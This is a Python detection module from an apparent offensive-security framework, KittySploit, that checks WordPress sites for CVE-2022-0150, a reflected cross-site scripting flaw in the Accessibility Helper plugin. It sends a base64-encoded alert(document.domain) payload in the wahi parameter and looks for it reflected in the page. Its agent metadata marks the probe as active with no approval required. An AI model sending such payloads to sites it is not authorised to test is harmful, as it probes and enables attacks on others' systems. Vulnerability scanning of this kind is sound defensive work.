#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Accessibility Helper plugin before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Accessibility Helper <0.6.0.7 - Cross-Site Scripting Detection',
        'description': 'WordPress Accessibility Helper plugin before 0.6.0.7 contains a cross-site scripting vulnerability. It does not sanitize and escape the wahi parameter before outputting back its base64 decode value in the page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'wp-plugin', 'wp', 'wpscan', 'xss', 'wp_accessibility_helper_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/7142a538-7c3d-4dd0-bd2c-cbd2efaf53c5',
            'https://plugins.trac.wordpress.org/changeset/2661008',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0150',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("var wah_target_src = '';alert(document.domain);//';",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Accessibility Helper <0.6.0.7 - Cross-Site Scripting detected",
                path='/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v',
            )
            return True
        return False

